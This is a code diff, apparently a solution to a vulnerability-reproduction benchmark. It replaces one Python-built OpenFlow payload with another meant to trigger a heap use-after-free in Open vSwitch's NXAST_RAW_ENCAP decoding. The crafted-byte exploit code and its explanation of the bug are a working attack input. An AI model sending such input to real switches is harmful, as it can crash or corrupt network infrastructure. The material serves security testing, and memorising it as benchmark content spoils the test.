@@ -11,84 +11,66 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
+        # The vulnerability is a Heap Use-After-Free in the decoding of
+        # NXAST_RAW_ENCAP actions in Open vSwitch. The function
+        # `decode_NXAST_RAW_ENCAP` gets a pointer `encap` to a structure
+        # within an output buffer `out`. It then calls property parsers. If a
+        # property parser causes the `out` buffer to be reallocated, the `encap`
+        # pointer becomes stale. The function then writes to this stale pointer.
+        #
+        # To trigger this, we construct an NXAST_RAW_ENCAP action containing an
+        # experimenter property that, when decoded, writes enough data to the `out`
+        # buffer to force a reallocation. The decoder for
+        # `NXT_BUNDLE_ADD_MSG_PROP_DATA` serves this purpose perfectly.
+
+        poc_len = 72
+        prop_len = 48
         
-        # This PoC triggers a use-after-free in the decoding of RAW_ENCAP actions.
-        # The vulnerability occurs when action normalization is performed in a buffer
-        # that gets reallocated. A stale pointer to the old buffer is then used.
-        #
-        # To trigger this, we construct an OpenFlow message that will cause the
-        # action buffer to be reallocated at a specific point.
-        # We use an OFPT_PACKET_OUT message, as it's a compact way to send a
-        # list of actions.
-        #
-        # The action list is crafted as follows:
-        # 1. Padding Actions: Three OFPAT_POP_VLAN actions. Each is 8 bytes on the
-        #    wire and decodes into an 8-byte ofpact structure. These fill the
-        #    initial 64-byte buffer with 3 * 8 = 24 bytes of data.
-        # 2. Trigger Action: An NXAST_RAW_ENCAP action. Its decoded ofpact
-        #    structure requires 48 bytes. When the decoder tries to allocate this,
-        #    the total required size (24 + 48 = 72 bytes) exceeds the initial
-        #    64-byte buffer capacity, forcing a re-allocation.
-        #
-        # The vulnerable code then uses a stale pointer into the old, freed buffer,
-        # leading to a crash when run with ASan. The total PoC size is engineered
-        # to be 72 bytes, matching the ground-truth length.
+        # Part 1: nx_action_encap header (24 bytes)
+        # This structure precedes the properties within the action.
+        OFPAT_EXPERIMENTER = 0xffff
+        NX_VENDOR_ID = 0x00002320
+        NXAST_RAW_ENCAP = 26
 
-        # Padding actions: 3x OFPAT_POP_VLAN (type=18, len=8)
-        # Each decoded ofpact is 8 bytes. Total padding: 24 bytes.
-        pop_vlan_action = struct.pack('!HH4s', 18, 8, b'\x00' * 4)
-        padding_actions = pop_vlan_action * 3
-
-        # Trigger action: NXAST_RAW_ENCAP (on-wire size 24 bytes)
-        # Decoded ofpact size is 48 bytes.
-        encap_action_len = 24
-        ofpat_vendor = 0xffff
-        nx_vendor_id = 0x00002320
-        nxast_raw_encap_subtype = 26
-
-        # nx_action_encap header (20 bytes)
-        encap_header = struct.pack(
-            '!HHIHHHHH2s',
-            ofpat_vendor,
-            encap_action_len,
-            nx_vendor_id,
-            nxast_raw_encap_subtype,
+        # The C struct `nx_action_encap` is 24 bytes on the wire due to padding.
+        # We pack its fields and add trailing padding to match.
+        # Fields layout: type(2), len(2), vendor(4), subtype(2),
+        # version(1), flags(1), proto(1), pad(5). This totals 18 bytes.
+        # The remaining 6 bytes are padding.
+        nae_header_format = '!HHIHBBB5s'
+        nae_header_packed_size = struct.calcsize(nae_header_format)
+        
+        nae_header = struct.pack(
+            nae_header_format,
+            OFPAT_EXPERIMENTER,
+            poc_len,
+            NX_VENDOR_ID,
+            NXAST_RAW_ENCAP,
+            0,  # ofp_version
             0,  # flags
-            0,  # class_id
-            0,  # type_id
-            0,  # len_id
-            b'\x00\x00'  # pad
+            0,  # proto
+            b'\x00' * 5
         )
-        
-        # A minimal property is needed to enter the vulnerable code path.
-        # type=1 (OFPPPT_TUNNEL_DST), len=4
-        prop = struct.pack('!HH', 1, 4)
-        
-        trigger_action = encap_header + prop
+        nae_header += b'\x00' * (24 - nae_header_packed_size)
 
-        actions = padding_actions + trigger_action
-        actions_len = len(actions)  # 24 + 24 = 48 bytes
+        # Part 2: Malicious Property (48 bytes)
+        # This is an ofp_prop_experimenter property that will be decoded by
+        # `decode_bundle_add_msg_prop_data`. Its payload will be copied
+        # to the output buffer, triggering the reallocation.
+        # Header size: 12 bytes. Data size: 48 - 12 = 36 bytes.
+        OFPTMPT_EXPERIMENTER = 0xffff
+        NXT_BUNDLE_ADD_MSG_PROP_DATA = 1
+        prop_data_len = prop_len - 12
 
-        # OFPT_PACKET_OUT message header
-        # 8 (OF header) + 16 (PACKET_OUT body) = 24 bytes
-        total_len = 24 + actions_len  # 24 + 48 = 72 bytes
-        ofp_version = 4
-        ofpt_packet_out = 13
-        
-        # OpenFlow header (8 bytes)
-        ofp_header = struct.pack('!BBHI', ofp_version, ofpt_packet_out, total_len, 0)
-        
-        # OFPT_PACKET_OUT body (16 bytes)
-        buffer_id_no_buffer = 0xffffffff
-        in_port_controller = 0xfffffffd
-        packet_out_body = struct.pack(
-            '!IIH6s',
-            buffer_id_no_buffer,
-            in_port_controller,
-            actions_len,
-            b'\x00' * 6
+        prop = struct.pack(
+            '!HHII',
+            OFPTMPT_EXPERIMENTER,
+            prop_len,
+            NX_VENDOR_ID,
+            NXT_BUNDLE_ADD_MSG_PROP_DATA
         )
+        prop += b'\x41' * prop_data_len
 
-        poc = ofp_header + packet_out_body + actions
-        
+        # The final PoC is the combination of the action header and the property.
+        poc = nae_header + prop
         return poc
